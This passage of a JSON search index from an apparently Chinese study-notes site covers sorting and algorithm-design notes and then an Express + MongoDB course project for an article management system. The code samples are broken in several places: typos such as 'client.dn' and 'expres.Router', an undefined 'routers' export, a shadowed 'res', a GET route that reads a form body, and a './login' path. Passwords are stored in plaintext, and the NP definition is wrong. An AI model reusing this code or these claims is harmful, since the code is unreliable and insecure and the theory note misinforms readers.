\u5e8f\u4f1a\u5f71\u54cd\u5212\u5206\u6b21\u6570\uff0c\u6240\u4ee5\u4f1a\u5f71\u54cd\u603b\u7684\u6bd4\u8f83\u6b21\u6570\uff0c\u4f46\u5feb\u6392\u5e73\u5747\u6bd4\u8f83\u6b21\u6570\u6700\u5c0f\uff1b\u5f52\u5e76\u6392\u5e8f\u5728\u5f52\u5e76\u7684\u65f6\u5019\uff0c\u5982\u679c\u53f3\u8def\u6700\u5c0f\u503c\u6bd4\u5de6\u8def\u6700\u5927\u503c\u8fd8\u5927\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u6bd4\u8f83n\u6b21\uff0c\u5982\u679c\u53f3\u8def\u6bcf\u4e2a\u5143\u7d20\u5206\u522b\u6bd4\u5de6\u8def\u5bf9\u5e94\u4f4d\u7f6e\u7684\u5143\u7d20\u5927\uff0c\u90a3\u4e48\u9700\u8981\u6bd4\u8f832*n-1\u6b21\uff0c\u6240\u4ee5\u4e0e\u521d\u59cb\u6392\u5e8f\u6709\u5173)</p> <p>\u7cbe\u4fed\u6392\u5e8f\uff0c\u5373\u4e00\u5bf9\u6570\u5b57\u4e0d\u8fdb\u884c\u4e24\u6b21\u548c\u4e24\u6b21\u4ee5\u4e0a\u7684\u6bd4\u8f83\uff0c\u63d2\u5165\u548c\u5f52\u5e76\u662f\u201c\u7cbe\u4fed\u6392\u5e8f\u201d\u3002\u63d2\u5165\u6392\u5e8f\uff0c\u524d\u9762\u662f\u6709\u5e8f\u7684\uff0c\u540e\u9762\u7684\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e0e\u524d\u9762\u6709\u5e8f\u7684\u5143\u7d20\u6bd4\u8f83\uff0c\u6bd4\u8f83\u8fc7\u7684\u5c31\u662f\u6709\u5e8f\u7684\u4e86\uff0c\u4e0d\u4f1a\u518d\u6bd4\u8f83\u4e00\u6b21\u3002\u5f52\u5e76\u6bcf\u6b21\u5408\u5e76\u540e\uff0c\u5185\u90e8\u90fd\u662f\u6709\u5e8f\u7684\uff0c\u5185\u90e8\u7684\u5143\u7d20\u4e4b\u95f4\u4e0d\u7528\u518d\u6bd4\u8f83\u3002\u9009\u62e9\u6392\u5e8f\uff0c\u6bcf\u6b21\u5728\u540e\u9762\u7684\u5143\u7d20\u4e2d\u627e\u5230\u6700\u5c0f\u7684\uff0c\u627e\u6700\u5c0f\u5143\u7d20\u7684\u8fc7\u7a0b\u662f\u5728\u6ca1\u6709\u6392\u597d\u5e8f\u7684\u90a3\u90e8\u5206\u8fdb\u884c\uff0c\u6240\u6709\u80af\u5b9a\u4f1a\u6bd4\u8f83\u591a\u6b21\u3002\u5806\u6392\u5e8f\u4e5f\u9700\u6bd4\u8f83\u591a\u6b21\u3002</p> <p>\u5916\u90e8\u6392\u5e8f</p> <p>\u751f\u6210\u5408\u5e76\u6bb5\uff08run\uff09\uff1a\u8bfb\u5165\u6587\u4ef6\u7684\u90e8\u5206\u8bb0\u5f55\u5230\u5185\u5b58\uff0d&gt;\u5728\u5185\u5b58\u4e2d\u8fdb\u884c\u5185\u90e8\u6392\u5e8f\uff0d&gt;\u5c06\u6392\u597d\u5e8f\u7684\u8fd9\u4e9b\u8bb0\u5f55\u5199\u5165\u5916\u5b58\uff0c\u5f62\u6210\u5408\u5e76\u6bb5\uff0d&gt;\u518d\u8bfb\u5165\u8be5\u6587\u4ef6\u7684\u4e0b\u9762\u7684\u8bb0\u5f55\uff0c\u5f80\u590d\u8fdb\u884c\uff0c\u76f4\u81f3\u6587\u4ef6\u4e2d\u7684\u8bb0\u5f55\u5168\u90e8\u5f62\u6210\u5408\u5e76\u6bb5\u4e3a\u6b62\u3002</p> <p>\u5916\u90e8\u5408\u5e76\uff1a\u5c06\u4e0a\u4e00\u9636\u6bb5\u751f\u6210\u7684\u5408\u5e76\u6bb5\u8c03\u5165\u5185\u5b58\uff0c\u8fdb\u884c\u5408\u5e76\uff0c\u76f4\u81f3\u6700\u540e\u5f62\u6210\u4e00\u4e2a\u6709\u5e8f\u7684\u6587\u4ef6\u3002</p> <p>\u5916\u90e8\u6392\u5e8f\u6307\u7684\u662f\u5927\u6587\u4ef6\u7684\u6392\u5e8f\uff0c\u5373\u5f85\u6392\u5e8f\u7684\u8bb0\u5f55\u5b58\u50a8\u5728\u5916\u5b58\u50a8\u5668\u4e0a\uff0c\u5f85\u6392\u5e8f\u7684\u6587\u4ef6\u65e0\u6cd5\u4e00\u6b21\u88c5\u5165\u5185\u5b58\uff0c\u9700\u8981\u5728\u5185\u5b58\u548c\u5916\u90e8\u5b58\u50a8\u5668\u4e4b\u95f4\u8fdb\u884c\u591a\u6b21\u6570\u636e\u4ea4\u6362\uff0c\u4ee5\u8fbe\u5230\u6392\u5e8f\u6574\u4e2a\u6587\u4ef6\u7684\u76ee\u7684\u3002\u5916\u90e8\u6392\u5e8f\u6700\u5e38\u7528\u7684\u7b97\u6cd5\u662f\u591a\u8def\u5f52\u5e76\u6392\u5e8f\uff0c\u5373\u5c06\u539f\u6587\u4ef6\u5206\u89e3\u6210\u591a\u4e2a\u80fd\u591f\u4e00\u6b21\u6027\u88c5\u5165\u5185\u5b58\u7684\u90e8\u5206\uff0c\u5206\u522b\u628a\u6bcf\u4e00\u90e8\u5206\u8c03\u5165\u5185\u5b58\u5b8c\u6210\u6392\u5e8f\u3002\u7136\u540e\uff0c\u5bf9\u5df2\u7ecf\u6392\u5e8f\u7684\u5b50\u6587\u4ef6\u8fdb\u884c\u591a\u8def\u5f52\u5e76\u6392\u5e8f</p> <p>\u4e0d\u7ba1\u521d\u59cb\u5e8f\u5217\u662f\u5426\u6709\u5e8f, \u5192\u6ce1\u3001\u9009\u62e9\u6392\u5e8f\u65f6\u95f4\u590d\u6742\u5ea6\u662fO(n^2),\u5f52\u5e76\u3001\u5806\u6392\u5e8f\u65f6\u95f4\u590d\u6742\u5ea6\u662fO(nlogn\uff09</p> <p>\u5916\u90e8\u6392\u5e8f\u7684\u603b\u65f6\u95f4 = \u5185\u90e8\u6392\u5e8f\uff08\u4ea7\u51fa\u521d\u59cb\u5f52\u5e76\u6bb5\uff09\u6240\u9700\u65f6\u95f4 + \u5916\u5b58\u4fe1\u606f\u8bfb\u53d6\u65f6\u95f4 + \u5185\u90e8\u5f52\u5e76\u6240\u9700\u7684\u65f6\u95f4</p> <p>\u5916\u6392\u4e2d\u4f7f\u7528\u7f6e\u6362\u9009\u62e9\u6392\u5e8f\u7684\u76ee\u7684,\u662f\u4e3a\u4e86\u589e\u52a0\u521d\u59cb\u5f52\u5e76\u6bb5\u7684\u957f\u5ea6\u3002\u51cf\u5c11\u5916\u5b58\u8bfb\u5199\u6b21\u6570\u9700\u8981\u51cf\u5c0f\u5f52\u5e76\u8d9f\u6570</p> <p>\u6839\u636e\u5185\u5b58\u5bb9\u91cf\u8bbe\u82e5\u5e72\u4e2a\u8f93\u5165\u7f13\u51b2\u533a\u548c\u4e00\u4e2a\u8f93\u51fa\u7f13\u51b2\u533a\u3002\u82e5\u91c7\u7528\u4e8c\u8def\u5f52\u5e76\uff0c\u7528\u4e24\u4e2a\u8f93\u5165\u7f13\u51b2\u3002</p> <p>\u5f52\u5e76\u7684\u65b9\u6cd5\u7c7b\u4f3c\u4e8e\u5f52\u5e76\u6392\u5e8f\u7684\u5f52\u5e76\u7b97\u6cd5\u3002\u589e\u52a0\u7684\u662f\u5bf9\u7f13\u51b2\u7684\u76d1\u89c6\uff0c\u5bf9\u4e8e\u8f93\u5165\uff0c\u4e00\u65e6\u7f13\u51b2\u7a7a\uff0c\u8981\u5230\u76f8\u5e94\u6587\u4ef6\u8bfb\u540e\u7eed\u6570\u636e\uff0c\u5bf9\u4e8e\u8f93\u51fa\u7f13\u51b2\uff0c\u4e00\u65e6\u7f13\u51b2\u6ee1\uff0c\u8981\u5c06\u7f13\u51b2\u5185\u5bb9\u5199\u5230\u6587\u4ef6\u4e2d\u53bb\u3002</p> <p>\u5916\u6392\u5e8f\u548c\u5185\u6392\u5e8f\u4e0d\u53ea\u662f\u8003\u8651\u5185\u5916\u6392\u5e8f\u7b97\u6cd5\u7684\u6027\u80fd\uff0c\u8fd8\u8981\u8003\u8651IO\u6570\u636e\u4ea4\u6362\u6548\u7387\u7684\u95ee\u9898\uff0c\u5185\u5b58\u5b58\u53d6\u901f\u5ea6\u8fdc\u8fdc\u9ad8\u4e8e\u5916\u5b58\u3002\u5f71\u54cd\u5916\u6392\u5e8f\u7684\u65f6\u95f4\u56e0\u7d20\u4e3b\u8981\u662f\u5185\u5b58\u4e0e\u5916\u8bbe\u4ea4\u6362\u4fe1\u606f\u7684\u603b\u6b21\u6570</p> <p>\u6709\u6548\u7684\u7b97\u6cd5\u8bbe\u8ba1</p> <p>\u8d2a\u5fc3\u6cd5\u3002Dijkstra\u7684\u6700\u77ed\u8def\u5f84(\u65f6\u95f4\u590d\u6742\u5ea6O(n2))\uff1bPrim\u6c42\u6700\u5c0f\u751f\u6210\u6811\u90bb\u63a5\u8868\u5b58\u50a8\u65f6\u662fO(n+e),\u56feO(n2)\uff1b\u5173\u952e\u8def\u5f84\u53ca\u5173\u952e\u6d3b\u52a8\u7684\u6c42\u6cd5\u3002</p> <p>\u56de\u6eaf\u6cd5</p> <p>\u5206\u652f\u9650\u754c\u6cd5</p> <p>\u5206\u6cbb\u6cd5\u3002\u5206\u5272\u3001\u6c42\u89e3\u3001\u5408\u5e76\u3002\u4e8c\u5206\u67e5\u627e\u3001\u5f52\u5e76\u6392\u5e8f\u3001\u5feb\u901f\u6392\u5e8f\u3002</p> <p>\u52a8\u6001\u89c4\u5212\u3002Floyd-Warshall\u7b97\u6cd5\u6c42\u89e3\u56fe\u4e2d\u6240\u6709\u70b9\u5bf9\u4e4b\u95f4\u6700\u77ed\u8def\u5f84\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(n3)</p> <p>\u52a8\u6001\u89c4\u5212\u89e3\u9898\u7684\u65b9\u6cd5\u662f\u4e00\u79cd\u9ad8\u6548\u7387\u7684\u65b9\u6cd5\uff0c\u5176\u65f6\u95f4\u590d\u6742\u5ea6\u901a\u5e38\u4e3aO(n2)\uff0cO(n3)\u7b49\uff0c\u53ef\u4ee5\u89e3\u51b3\u76f8\u5f53\u5927\u7684\u4fe1\u606f\u91cf\u3002\uff08\u6570\u5854\u5728n&lt;=100\u5c42\u65f6\uff0c\u53ef\u4ee5\u5728\u5f88\u77ed\u7684\u65f6\u95f4\u5185\u5f97\u5230\u95ee\u9898\u89e3\uff09</p> <p>\u9002\u7528\u7684\u539f\u5219\uff1a\u539f\u5219\u4e3a\u4f18\u5316\u539f\u5219\uff0c\u5373\u6574\u4f53\u4f18\u5316\u53ef\u4ee5\u5206\u89e3\u4e3a\u82e5\u5e72\u4e2a\u5c40\u90e8\u4f18\u5316\u3002</p> <p>\u52a8\u6001\u89c4\u5212\u6bd4\u7a77\u4e3e\u6cd5\u5177\u6709\u8f83\u5c11\u7684\u8ba1\u7b97\u6b21\u6570</p> <p>\u9012\u5f52\u7b97\u6cd5\u9700\u8981\u5f88\u5927\u7684\u6808\u7a7a\u95f4\uff0c\u800c\u52a8\u6001\u89c4\u5212\u4e0d\u9700\u8981\u6808\u7a7a\u95f4</p> <p>\u8d2a\u5fc3\u548c\u52a8\u6001\u89c4\u5212\u7684\u5dee\u522b\uff1a</p> <p>\u6240\u8c13\u8d2a\u5fc3\u9009\u62e9\u6027\u8d28\u662f\u6307\u6240\u6c42\u95ee\u9898\u7684\u6574\u4f53\u6700\u4f18\u89e3\u53ef\u4ee5\u901a\u8fc7\u4e00\u7cfb\u5217\u5c40\u90e8\u6700\u4f18\u7684\u9009\u62e9\uff0c\u5373\u8d2a\u5fc3\u9009\u62e9\u6765\u8fbe\u5230\u3002\u8fd9\u662f\u8d2a\u5fc3\u7b97\u6cd5\u53ef\u884c\u7684\u7b2c\u4e00\u4e2a\u57fa\u672c\u8981\u7d20\uff0c\u4e5f\u662f\u8d2a\u5fc3\u7b97\u6cd5\u4e0e\u52a8\u6001\u89c4\u5212\u7b97\u6cd5\u7684\u4e3b\u8981\u533a\u522b\u3002</p> <p>\u5728\u52a8\u6001\u89c4\u5212\u7b97\u6cd5\u4e2d\uff0c\u6bcf\u6b65\u6240\u4f5c\u7684\u9009\u62e9\u5f80\u5f80\u4f9d\u8d56\u4e8e\u76f8\u5173\u5b50\u95ee\u9898\u7684\u89e3\u3002\u56e0\u800c\u53ea\u6709\u5728\u89e3\u51fa\u76f8\u5173\u5b50\u95ee\u9898\u540e\uff0c\u624d\u80fd\u4f5c\u51fa\u9009\u62e9\u3002\u800c\u5728\u8d2a\u5fc3\u7b97\u6cd5\u4e2d\uff0c\u4ec5\u5728\u5f53\u524d\u72b6\u6001\u4e0b\u4f5c\u51fa\u6700\u597d\u9009\u62e9\uff0c\u5373\u5c40\u90e8\u6700\u4f18\u9009\u62e9\u3002\u7136\u540e\u518d\u53bb\u89e3\u4f5c\u51fa\u8fd9\u4e2a\u9009\u62e9\u540e\u4ea7\u751f\u7684\u76f8\u5e94\u7684\u5b50\u95ee\u9898\u3002</p> <p>\u8d2a\u5fc3\u7b97\u6cd5\u6240\u4f5c\u7684\u8d2a\u5fc3\u9009\u62e9\u53ef\u4ee5\u4f9d\u8d56\u4e8e\u4ee5\u5f80\u6240\u4f5c\u8fc7\u7684\u9009\u62e9\uff0c\u4f46\u51b3\u4e0d\u4f9d\u8d56\u4e8e\u5c06\u6765\u6240\u4f5c\u7684\u9009\u62e9\uff0c\u4e5f\u4e0d\u4f9d\u8d56\u4e8e\u5b50\u95ee\u9898\u7684\u89e3\u3002\u6b63\u662f\u7531\u4e8e\u8fd9\u79cd\u5dee\u522b\uff0c\u52a8\u6001\u89c4\u5212\u7b97\u6cd5\u901a\u5e38\u4ee5\u81ea\u5e95\u5411\u4e0a\u7684\u65b9\u5f0f\u89e3\u5404\u5b50\u95ee\u9898\uff0c\u800c\u8d2a\u5fc3\u7b97\u6cd5\u5219\u901a\u5e38\u4ee5\u81ea\u9876\u5411\u4e0b\u7684\u65b9\u5f0f\u8fdb\u884c,\u4ee5\u8fed\u4ee3\u7684\u65b9\u5f0f\u4f5c\u51fa\u76f8\u7ee7\u7684\u8d2a\u5fc3\u9009\u62e9\uff0c\u6bcf\u4f5c\u4e00\u6b21\u8d2a\u5fc3\u9009\u62e9\u5c31\u5c06\u6240\u6c42\u95ee\u9898\u7b80\u5316\u4e3a\u4e00\u4e2a\u89c4\u6a21\u66f4\u5c0f\u7684\u5b50\u95ee\u9898\u3002 </p> <p>P\u95ee\u9898</p> <p>P\u95ee\u9898\uff0c\u5982\u679c\u5b83\u53ef\u4ee5\u901a\u8fc7\u8fd0\u884c\u591a\u9879\u5f0f\u6b21(\u5373\u8fd0\u884c\u65f6\u95f4\u81f3\u591a\u662f\u8f93\u5165\u91cf\u5927\u5c0f\u7684\u591a\u9879\u5f0f\u51fd\u6570\u7684\u4e00\u79cd\u7b97\u6cd5\u83b7\u5f97\u89e3\u51b3\uff09\uff0c\u53ef\u4ee5\u627e\u5230\u4e00\u4e2a\u80fd\u5728\u591a\u9879\u5f0f\u7684\u65f6\u95f4\u91cc\u89e3\u51b3\u5b83\u7684\u7b97\u6cd5\u3002\u2014-\u786e\u5b9a\u6027\u95ee\u9898</p> <p>NP\u95ee\u9898\uff0c\u867d\u7136\u53ef\u4ee5\u7528\u8ba1\u7b97\u673a\u6c42\u89e3\uff0c\u4f46\u662f\u5bf9\u4e8e\u4efb\u610f\u5e38\u6570k\uff0c\u5b83\u4eec\u4e0d\u80fd\u5728O(nk)\u65f6\u95f4\u5185\u5f97\u5230\u89e3\u7b54\uff0c\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u7684\u65f6\u95f4\u91cc\u9a8c\u8bc1\u4e00\u4e2a\u89e3\u7684\u95ee\u9898\u3002\u6240\u6709\u7684P\u7c7b\u95ee\u9898\u90fd\u662fNP\u95ee\u9898\u3002</p> <p>NP\u5b8c\u5168\u95ee\u9898\uff0c\u77e5\u9053\u6709\u6548\u7684\u975e\u786e\u5b9a\u6027\u7b97\u6cd5\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u662f\u5426\u5b58\u5728\u6709\u6548\u7684\u786e\u5b9a\u6027\u7b97\u6cd5\uff0c\u540c\u65f6\uff0c\u4e0d\u80fd\u8bc1\u660e\u8fd9\u4e9b\u95ee\u9898\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\u4e0d\u5b58\u5728\u6709\u6548\u7684\u786e\u5b9a\u6027\u7b97\u6cd5\u3002\u8fd9\u7c7b\u95ee\u9898\u79f0\u4e3aNP\u5b8c\u5168\u95ee\u9898\u3002</p>"},{"location":"other/ebbok-qianfeng-express/","title":"\u5343\u950b\u6559\u80b2 express \u9879\u76ee","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 1647  \u9605\u8bfb4\u5206\u949f</p> <p>\u5343\u950b\u6559\u80b2\u5c0f\u6848\u4f8b\uff0c\u4e00\u4e2a14\u8282\u7684\u5c0f\u8bfe\u7a0b\uff0c\u4e3b\u8981\u7ed3\u5408\u4e2a\u4eba\u5728\u7ebf\u5c0f\u8bf4\u9605\u8bfb\u5668\u9879\u76ee\u8fdb\u884c\u5b9e\u8df5\u3002</p> <p>\u8bfe\u7a0b\u6ca1\u5b66\u5b8c</p> <p>\ufeffhttps://study.163.com/course/introduction.htm?courseId=1209598899#/courseDetail?tab=1\ufeff </p>"},{"location":"other/ebbok-qianfeng-express/#01","title":"01 \u9700\u6c42\u5206\u6790","text":"<p>\u9700\u6c42\uff1a\u505a\u4e00\u4e2a\u6587\u7ae0\u7ba1\u7406\u7cfb\u7edf\uff0c\u6280\u672f\u6808\u4e3a express + nodejs + mongdb\u3002\u6574\u4f53\u9879\u76ee\u662f\u540e\u7aef\u9879\u76ee\uff0c\u524d\u7aef\u754c\u9762\u5b9e\u73b0\u529f\u80fd\u4e3a\u4e3b\uff0c\u6ca1\u6709\u592a\u591a CSS \u5b9e\u73b0\u3002</p> <p>\u539f\u578b\u56fe\u4e2d\u6709\u4e94\u4e2a\u754c\u9762\uff1a\u6ce8\u518c\u3001\u767b\u5f55\u3001\u9996\u9875\u3001\u6587\u7ae0\u7f16\u8f91\u3001\u6587\u7ae0\u8be6\u60c5\u754c\u9762</p> <p>\u6ce8\u518c\uff1a\u4e00\u4e2a\u8868\u5355\uff1a\u7528\u6237\u540d\uff0c\u5bc6\u7801\uff0c\u786e\u8ba4\u5bc6\u7801\uff0c\u6ce8\u518c\u6309\u94ae\uff0c\u8df3\u8f6c\u767b\u5f55</p> <p>\u767b\u5f55\uff1a\u4e00\u4e2a\u8868\u5355\uff1a\u7528\u6237\u540d\uff0c\u5bc6\u7801\uff0c\u767b\u5f55\u6309\u94ae\uff0c\u8df3\u8f6c\u6ce8\u518c</p> <p>\u9996\u9875\uff1a\u4e0a\u8fb9 header\uff1a\u5de6\u4fa7\u662f\u4ea7\u54c1 LOGO\uff0c\u53f3\u8fb9\u662f\u7528\u6237\u5934\u50cf\uff08\u4e0b\u62c9\u83dc\u5355\u4e2d\u6709\uff1a\u8bbe\u7f6e\uff0c\u9000\u51fa\uff09\u4e2d\u95f4\u662f\u6587\u7ae0\u5217\u8868\uff08\u5e8f\u53f7\uff0c\u4f5c\u8005\uff0c\u6807\u9898\uff0c\u53d1\u5e03\u65f6\u95f4\uff0c\u7f16\u8f91\uff0c\u5220\u9664\u7b49\uff09\u5e95\u90e8\u662f\u8df3\u8f6c\uff08\u524d\u4e00\u9875\uff0c\u540e\u4e00\u9875\uff0c\u9996\u9875\uff0c\u5c3e\u9875\uff0c\u5171\u591a\u5c11\u9875\u7b49\uff09</p> <p>\u6587\u7ae0\u7f16\u8f91\uff1a\u8f93\u5165\u6587\u7ae0\u6807\u9898\uff0c\u6587\u7ae0\u5185\u5bb9\uff0c\u53f3\u4e0b\u65b9\u662f\u53d1\u5e03\u7684\u6309\u94ae\uff08\u4e5f\u652f\u6301\u7f16\u8f91\u5df2\u6709\u7684\u5c0f\u8bf4\uff09\u5934\u90e8\u7684\u7ec4\u4ef6\u4e0d\u53d8 Header \u901a\u7528</p> <p>\u6587\u7ae0\u8be6\u60c5\uff1a\u53ea\u8bfb\u7684\u754c\u9762\uff0c\u4e0a\u9762\u662f\u9898\u76ee\uff0c\u4e2d\u95f4\u662f\u4f5c\u8005\u548c\u53d1\u5e03\u65f6\u95f4\uff0c\u4e0b\u9762\u662f\u5177\u4f53\u7684\u5185\u5bb9\u3002\u5934\u90e8\u7684\u7ec4\u4ef6\u4e0d\u53d8 Header \u901a\u7528</p>"},{"location":"other/ebbok-qianfeng-express/#02-express-mongodb","title":"02 \u521d\u59cb\u5316 express + mongodb","text":"<p>\u4f7f\u7528 express-generator CLI \u521d\u59cb\u5316\u9879\u76ee\u7ed3\u6784\uff08\u5168\u5c40\u5b89\u88c5\uff09\uff0c\u9700\u8981\u5168\u5c40\u5b89\u88c5 nodemon \u53ef\u4ee5\u4fdd\u8bc1 node \u670d\u52a1\u7aef\u70ed\u66f4\u65b0\uff0c\u521b\u5efa\u4f7f\u7528 ejs \u6a21\u677f\u3002</p> <p>\u9700\u8981\u5b89\u88c5 mongoDB \u670d\u52a1\u5668\uff0c\u5728\u9879\u76ee\u4e2d\u5efa\u7acb\u94fe\u63a5\uff08\u8fd9\u91cc\u6839\u636e\u5b9e\u9645\u5b89\u88c5\u7684\u6570\u636e\u5e93\u64cd\u4f5c\uff09\u3002</p>"},{"location":"other/ebbok-qianfeng-express/#_1","title":"\u6570\u636e\u5e93\u8bbe\u8ba1","text":"<p>\u7528\u6237\u8868</p> <p>\u4e66\u7c4d\u8868</p> <p>\u770b\u5230 09 \u5206</p>"},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/","title":"express\u56fe\u4e66\u9986\u9879\u76ee","text":""},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#01","title":"01 \u4ea7\u54c1\u9700\u6c42\u5206\u6790","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 9717  \u9605\u8bfb20\u5206\u949f</p> <p>\u9700\u6c42\uff1a\u505a\u4e00\u4e2a\u6587\u7ae0\u7ba1\u7406\u7cfb\u7edf\uff0c\u6280\u672f\u6808\u4e3a express + nodejs + mongdb\u3002\u6574\u4f53\u9879\u76ee\u662f\u540e\u7aef\u9879\u76ee\uff0c\u524d\u7aef\u754c\u9762\u5b9e\u73b0\u529f\u80fd\u4e3a\u4e3b\uff0c\u6ca1\u6709\u592a\u591a CSS \u5b9e\u73b0\u3002</p> <p>\u539f\u578b\u56fe\u4e2d\u6709\u4e94\u4e2a\u754c\u9762\uff1a\u6ce8\u518c\u3001\u767b\u5f55\u3001\u9996\u9875\u3001\u6587\u7ae0\u7f16\u8f91\u3001\u6587\u7ae0\u8be6\u60c5\u754c\u9762</p> <ul> <li>\u6ce8\u518c\uff1a\u4e00\u4e2a\u8868\u5355\uff1a\u7528\u6237\u540d\uff0c\u5bc6\u7801\uff0c\u786e\u8ba4\u5bc6\u7801\uff0c\u6ce8\u518c\u6309\u94ae\uff0c\u8df3\u8f6c\u767b\u5f55</li> <li>\u767b\u5f55\uff1a\u4e00\u4e2a\u8868\u5355\uff1a\u7528\u6237\u540d\uff0c\u5bc6\u7801\uff0c\u767b\u5f55\u6309\u94ae\uff0c\u8df3\u8f6c\u6ce8\u518c</li> <li>\u9996\u9875\uff1a\u4e0a\u8fb9 header\uff1a\u5de6\u4fa7\u662f\u4ea7\u54c1 LOGO\uff0c\u53f3\u8fb9\u662f\u7528\u6237\u5934\u50cf\uff08\u4e0b\u62c9\u83dc\u5355\u4e2d\u6709\uff1a\u8bbe\u7f6e\uff0c\u9000\u51fa\uff09\u4e2d\u95f4\u662f\u6587\u7ae0\u5217\u8868\uff08\u5e8f\u53f7\uff0c\u4f5c\u8005\uff0c\u6807\u9898\uff0c\u53d1\u5e03\u65f6\u95f4\uff0c\u7f16\u8f91\uff0c\u5220\u9664\u7b49\uff09\u5e95\u90e8\u662f\u8df3\u8f6c\uff08\u524d\u4e00\u9875\uff0c\u540e\u4e00\u9875\uff0c\u9996\u9875\uff0c\u5c3e\u9875\uff0c\u5171\u591a\u5c11\u9875\u7b49\uff09</li> <li>\u6587\u7ae0\u7f16\u8f91\uff1a\u8f93\u5165\u6587\u7ae0\u6807\u9898\uff0c\u6587\u7ae0\u5185\u5bb9\uff0c\u53f3\u4e0b\u65b9\u662f\u53d1\u5e03\u7684\u6309\u94ae\uff08\u4e5f\u652f\u6301\u7f16\u8f91\u5df2\u6709\u7684\u5c0f\u8bf4\uff09\u5934\u90e8\u7684\u7ec4\u4ef6\u4e0d\u53d8 Header \u901a\u7528</li> <li>\u6587\u7ae0\u8be6\u60c5\uff1a\u53ea\u8bfb\u7684\u754c\u9762\uff0c\u4e0a\u9762\u662f\u9898\u76ee\uff0c\u4e2d\u95f4\u662f\u4f5c\u8005\u548c\u53d1\u5e03\u65f6\u95f4\uff0c\u4e0b\u9762\u662f\u5177\u4f53\u7684\u5185\u5bb9\u3002\u5934\u90e8\u7684\u7ec4\u4ef6\u4e0d\u53d8 Header \u901a\u7528</li> </ul>"},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#02-express-mongodb","title":"02 \u521d\u59cb\u5316 express + mongodb","text":"<p>\u6570\u636e\u5e93\u8bbe\u8ba1\uff1a\u5305\u62ec\u4e24\u4e2a\u6570\u636e\u5e93\u8868\uff0c\u7528\u6237\u8868\uff1b\u4e66\u7c4d\u8868</p> <p>\u4f7f\u7528 express-generator CLI \u521d\u59cb\u5316\u9879\u76ee\u7ed3\u6784\uff08\u5168\u5c40\u5b89\u88c5\uff09\uff0c\u9700\u8981\u5168\u5c40\u5b89\u88c5 nodemon \u53ef\u4ee5\u4fdd\u8bc1 node \u670d\u52a1\u7aef\u70ed\u66f4\u65b0\uff0c\u521b\u5efa\u4f7f\u7528 ejs \u6a21\u677f\u3002</p> <p>\u9700\u8981\u5b89\u88c5 mongoDB \u670d\u52a1\u5668\uff0c\u5728\u9879\u76ee\u4e2d\u5efa\u7acb\u94fe\u63a5\uff08\u8fd9\u91cc\u6839\u636e\u5b9e\u9645\u5b89\u88c5\u7684\u6570\u636e\u5e93\u64cd\u4f5c\uff09\u3002\u7c7b\u4f3c mysql \u94fe\u63a5\u7684\u6b65\u9aa4\u3002</p> <p>model.js</p> <pre><code>var MongoClient = require('mongodb').MongoClient;\nvar url = 'mongodb://localhost:27017';\nvar dbName = 'project';\n\n// \u5c01\u88c5\u6570\u636e\u5e93\u7684\u8fde\u63a5\u65b9\u6cd5\nfunction connect(cb) {\n  MongoClient.connect(url, (err, client) =&gt; {\n    if (err) {\n      console.log(err);\n    } else {\n      let db = client.dn(dbName);\n      cb &amp;&amp; cb(db);\n      client.close();\n    }\n  })\n}\n\nmodule.exports = { connect };\n</code></pre> <p>Routers.js \u8c03\u7528\u8fde\u63a5\u7684\u65b9\u6cd5</p> <pre><code>var express = require('express');\nvar model = require('../model');\nvar router = expres.Router();\n\nrouter.get('/', (req, res, next) =&gt; {\n  model.connect((db) =&gt; {\n    db.collection('users').find().toArray((err, res) =&gt; {\n      console.log(res);\n      res.render('index', { title: 'Demo' });\n    });\n  });\n});\n\nmodule.exports = routers;\n</code></pre>"},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#3","title":"\u8bfe\u65f63    \u6ce8\u518c\u529f\u80fd","text":"<p>ejs \u6a21\u677f\u62bd\u53d6\u516c\u5171\u90e8\u5206\uff0chead.ejs</p> <pre><code>&lt;meta charset=\"UTF-8\"/&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n&lt;link rel=\"stylesheet\" href=\"/stylesheets/style.css\" /&gt;\n</code></pre> <p>\u5728\u9875\u9762\u6a21\u677f\u4e2d\uff0c\u4f7f\u7528 include \u8bed\u6cd5\uff0c\u5373\u53ef\u4f7f\u7528\u516c\u5171\u90e8\u5206\u4ee3\u7801</p> <p>regist.ejs</p> <pre><code>&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;title&gt;\u6ce8\u518c&lt;/title&gt;\n    &lt;%- include head %&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;h3&gt;\n      \u6ce8\u518c\u9875\u9762\n    &lt;/h3&gt;\n    &lt;div&gt;\n      &lt;form action=\"/user/regist\" method=\"post\"&gt;\n        &lt;input type=\"text\" name=\"username\" placeholder=\"\u8bf7\u8f93\u5165\u7528\u6237\u540d\"&gt;\n        &lt;input type=\"submit\" name=\"\" value=\"\u6ce8\u518c\"/&gt;\n      &lt;/form&gt;\n    &lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u8def\u7531\u90e8\u5206\u589e\u52a0</p> <pre><code>// \u6ce8\u518c\u9875\u9762\nrouter.get('/regist', function(req, res, next) {\n  const { username, password } = req.body;\n  var data = {\n    username, password\n  };\n  model.connect(function(db) {\n    db.collection('users').insertOne(data, function(err, ret) {\n      if (err) {\n        console.log('\u6ce8\u518c\u5931\u8d25')\n        res.redirect('regist');\n      }\n    })\n  });\n  // \u8fd4\u56de\u6210\u529f\n  res.send(data);\n});\n</code></pre>"},{"location":"other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/#4","title":"\u8bfe\u65f64    \u767b\u5f55\u529f\u80fd","text":"<pre><code>// routers.js\nrouter.post('./login', function(req, res, next) 